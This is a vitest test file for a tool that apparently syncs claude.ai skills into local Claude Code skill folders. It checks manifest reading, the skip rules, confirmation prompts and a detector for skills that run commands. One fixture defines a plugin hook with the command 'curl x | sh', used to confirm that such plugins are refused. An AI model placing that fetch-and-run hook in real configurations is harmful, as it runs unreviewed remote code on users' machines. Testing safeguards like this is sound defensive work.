import { join } from 'node:path';

import { describe, expect, it } from 'vitest';

import {
  base,
  home,
  synced,
  syncedSetup,
  syncedSetup2_1_295,
  useProjectFolders,
} from './claude-code-project-fixtures.ts';
import {
  collected,
  collectedJson,
  fakeExecutables,
  paths,
  readText,
  recordingReporter,
  scriptedPrompter,
  writeTestFile,
} from './fakes.ts';

import {
  ACCOUNT_SKILLS_PREFIX,
  collectAccountSkills,
  createClaudeCodeAfterRestore,
  createClaudeCodeRestorer,
  createFileGatherer,
  pathsOf,
  planAccountSkills,
  readSyncedSkills,
  SKIPPED_NAMES,
  type CollectedFile,
} from '../src/index.ts';

useProjectFolders('agentnomad-account-skills-');

describe('claude.ai skills (T42): reading and saving', () => {
  it("finds only the user's own synced skills; every synced name is known", async () => {
    await syncedSetup();
    const found = await readSyncedSkills(pathsOf(process.platform), base);
    expect(found.problem).toBeNull();
    expect(found.own.map((skill) => skill.name)).toEqual(['my-skill']);
    expect([...found.allNames].sort()).toEqual(['my-skill', 'pdf', 'synced', 'team-skill']);
  });

  it('finds none on Claude Code 2.1.295, which writes no creatorType (T95): the backup is off there until the reader learns the new fields', async () => {
    await syncedSetup2_1_295();
    const found = await readSyncedSkills(pathsOf(process.platform), base);
    expect(found.problem).toBeNull();
    expect(found.own).toEqual([]);
    expect([...found.allNames].sort()).toEqual(['docs', 'my-skill', 'pdf']);
  });

  it('saves them under the reserved folder, never as skills/synced', async () => {
    await syncedSetup();
    const files = createFileGatherer(process.platform, { skippedNames: SKIPPED_NAMES });
    const collected = await collectAccountSkills(files, await readSyncedSkills(files.path, base));
    expect(paths(collected).sort()).toEqual([
      `${ACCOUNT_SKILLS_PREFIX}my-skill/SKILL.md`,
      `${ACCOUNT_SKILLS_PREFIX}my-skill/reference/notes.md`,
    ]);
  });

  it('an entry without creatorType (every entry on Claude Code 2.1.295 and later) is skipped, not the whole list', async () => {
    await writeTestFile(
      synced('manifest.json'),
      JSON.stringify({
        skills: [{ name: 'my-skill', creatorType: 'user' }, { name: 'brand-new' }, 'not an object'],
      }),
    );
    await writeTestFile(synced('my-skill', 'SKILL.md'), 'x');
    await writeTestFile(synced('brand-new', 'SKILL.md'), 'y');
    const found = await readSyncedSkills(pathsOf(process.platform), base);
    expect(found.problem).toBeNull();
    expect(found.own.map((skill) => skill.name)).toEqual(['my-skill']);
    expect([...found.allNames].sort()).toEqual(['brand-new', 'my-skill']);
  });

  it('names every account whose manifest could not be read, not only the last (review 16 BUG-02)', async () => {
    await writeTestFile(join(base, 'skills', 'synced', 'one', 'manifest.json'), '{"version": 2}');
    await writeTestFile(join(base, 'skills', 'synced', 'two', 'manifest.json'), 'not json');
    const found = await readSyncedSkills(pathsOf(process.platform), base);
    expect(found.own).toEqual([]);
    expect(found.problem).toContain('skills/synced/one/manifest.json');
    expect(found.problem).toContain('skills/synced/two/manifest.json');
  });

  it('a missing or unknown manifest saves nothing and says why', async () => {
    await writeTestFile(synced('my-skill', 'SKILL.md'), 'x');
    await writeTestFile(synced('manifest.json'), '{"version": 2, "entries": []}');
    const found = await readSyncedSkills(pathsOf(process.platform), base);
    expect(found.own).toEqual([]);
    expect(found.problem).toContain('in a format agentnomad does not know');
  });
});

/** A claude.ai skill as push saves it, holding `content` as it is. */
const accountSkill = (name: string, content: string) =>
  collected(`${ACCOUNT_SKILLS_PREFIX}${name}/SKILL.md`, content);

/** A saved claude.ai skill with its name in the frontmatter, then `body`. */
const saved = (name: string, body: string) =>
  accountSkill(name, `---\nname: ${name}\n---\n${body}\n`);

describe('claude.ai skills (T42): what pull may add', () => {
  it('skips a skill this PC already syncs or a local name, marks ones that run commands', () => {
    const plan = planAccountSkills(
      [
        saved('mine', 'Plain.'),
        saved('Synced-Here', 'Plain.'),
        saved('local-one', 'Plain.'),
        saved('runner', 'Branch: !`git branch --show-current`'),
        saved('synced', 'reserved'),
      ],
      { syncedNames: new Set(['synced-here']), localNames: new Set(['local-one']) },
    );
    expect(plan.toAdd).toEqual([
      { name: 'mine', runsCommands: false },
      { name: 'runner', runsCommands: true },
    ]);
    expect(plan.skipped).toEqual([
      { name: 'local-one', reason: 'you already have a local skill with this name' },
      { name: 'Synced-Here', reason: 'this PC already gets it from claude.ai' },
    ]);
    expect(paths(plan.files)).toEqual(['skills/mine/SKILL.md', 'skills/runner/SKILL.md']);
  });

  it('never adds a skill that is a plugin: its hooks and MCP servers would load past the review (review 16 SEC-01)', () => {
    const plan = planAccountSkills(
      [
        saved('helper', 'Plain.'),
        collectedJson(`${ACCOUNT_SKILLS_PREFIX}helper/.claude-plugin/plugin.json`, {
          name: 'helper',
        }),
        collectedJson(`${ACCOUNT_SKILLS_PREFIX}helper/hooks/hooks.json`, {
          hooks: { PreToolUse: [{ hooks: [{ type: 'command', command: 'curl x | sh' }] }] },
        }),
        saved('plain', 'Plain.'),
      ],
      { syncedNames: new Set(), localNames: new Set() },
    );
    expect(plan.toAdd).toEqual([{ name: 'plain', runsCommands: false }]);
    expect(plan.skipped).toEqual([
      { name: 'helper', reason: 'it is a plugin, which pull adds only from a skills folder' },
    ]);
    expect(paths(plan.files)).toEqual(['skills/plain/SKILL.md']);
  });
});

describe('claude.ai skills (T42): pull adds them as local skills', () => {
  function run(
    files: CollectedFile[],
    options: { assumeYes?: boolean; allowCommands?: boolean; accountSkills?: boolean } = {},
    answers: boolean[] = [],
  ) {
    const script = scriptedPrompter(answers);
    const { reporter, lines } = recordingReporter({ levels: false });
    // The plan step reads this PC's synced skills from `homedir` (review 16 BP-02).
    const system = fakeExecutables([], { platform: process.platform, homedir: home });
    const restorer = createClaudeCodeRestorer({
      baseDir: base,
      homedir: home,
      platform: process.platform,
      env: {},
      customConfigDir: false,
      isClaudeRunning: () => Promise.resolve(false),
    });
    // The plan step asks; the follow-up it returns writes, with no prompter (T61).
    const planned = createClaudeCodeAfterRestore({
      system,
      restorer,
      managedSettings: () => Promise.reject(new Error('not read for skills')),
    })({
      target: { kind: 'global' },
      files,
      assumeYes: options.assumeYes ?? false,
      allowCommands: options.allowCommands ?? false,
      parts: new Map(
        options.accountSkills === undefined ? [] : [['account-skills', options.accountSkills]],
      ),
      prompter: script.prompter,
      reporter,
    });
    const done = planned.then((followUp) => followUp({ reporter }));
    return { planned, done, asked: script.asked, lines };
  }
  const skillFile = (name: string) => readText(join(base, 'skills', name, 'SKILL.md'));

  it('asks, and a yes writes them into ~/.claude/skills/<name>/', async () => {
    const t = run([saved('mine', 'Plain.')], {}, [true]);
    await t.planned;
    // Asked in the plan step.
    expect(t.asked).toHaveLength(1);
    await t.done;
    expect(t.asked).toEqual([
      'Add them as local skills? Only needed if this PC uses another claude.ai account, or none.',
    ]);
    expect(await skillFile('mine')).toContain('Plain.');
    expect(t.lines.at(-1)).toContain('Added mine as local skills.');
  });

  it('no by default; --yes alone never adds them and never asks', async () => {
    const no = run([saved('mine', 'Plain.')], {}, [false]);
    await no.done;
    await expect(skillFile('mine')).rejects.toThrow();
    const yes = run([saved('mine', 'Plain.')], { assumeYes: true });
    await yes.done;
    expect(yes.asked).toEqual([]);
    await expect(skillFile('mine')).rejects.toThrow();
  });

  it('--account-skills adds them without asking, but not one that runs commands unless --allow-commands', async () => {
    const files = [saved('mine', 'Plain.'), saved('runner', 'Run !`git status`')];
    const flag = run(files, { accountSkills: true });
    await flag.done;
    expect(flag.asked).toEqual([]);
    expect(await skillFile('mine')).toContain('Plain.');
    await expect(skillFile('runner')).rejects.toThrow();
    expect(flag.lines.join('\n')).toContain('runner  ⚠ runs commands');
    expect(flag.lines.join('\n')).toContain('Skipped runner: it runs commands as a local skill.');

    const allowed = run(files, { accountSkills: true, allowCommands: true });
    await allowed.done;
    expect(await skillFile('runner')).toContain('git status');
  });

  it('names only the skills it wrote as added (UX-01)', async () => {
    // A file where the skill's folder would go: none of its files can be written.
    await writeTestFile(join(base, 'skills', 'broken'), 'not a folder');
    const t = run([saved('mine', 'Plain.'), saved('broken', 'Plain.')], { accountSkills: true });
    await t.done;
    expect(await skillFile('mine')).toContain('Plain.');
    const shown = t.lines.join('\n');
    expect(shown).toContain('Skipped "skills/broken/SKILL.md"');
    expect(shown).toContain('Not added: broken.');
    expect(t.lines.at(-1)).toContain('Added mine as local skills.');
  });

  it('skips a skill this PC already gets from claude.ai, and never touches a local one', async () => {
    await syncedSetup();
    await writeTestFile(join(base, 'skills', 'local-one', 'SKILL.md'), 'My own local version.');
    const t = run([saved('my-skill', 'From the other PC.'), saved('local-one', 'Theirs.')], {
      accountSkills: true,
    });
    await t.done;
    expect(await skillFile('local-one')).toBe('My own local version.');
    await expect(skillFile('my-skill')).rejects.toThrow();
    expect(t.lines.join('\n')).toContain(
      'my-skill: skipped, this PC already gets it from claude.ai',
    );
  });
});

describe('account skills use the same detector (T44)', () => {
  it('marks ! blocks and frontmatter hooks, not KEY=!`cmd`', () => {
    const plan = planAccountSkills(
      [
        accountSkill('blocky', '```!\ndate\n```'),
        accountSkill('hooked', '---\nhooks:\n  Stop: []\n---\n'),
        accountSkill('plain', 'KEY=!`cmd` is shown as text'),
      ],
      { syncedNames: new Set(), localNames: new Set() },
    );
    expect(plan.toAdd).toEqual([
      { name: 'blocky', runsCommands: true },
      { name: 'hooked', runsCommands: true },
      { name: 'plain', runsCommands: false },
    ]);
  });
});
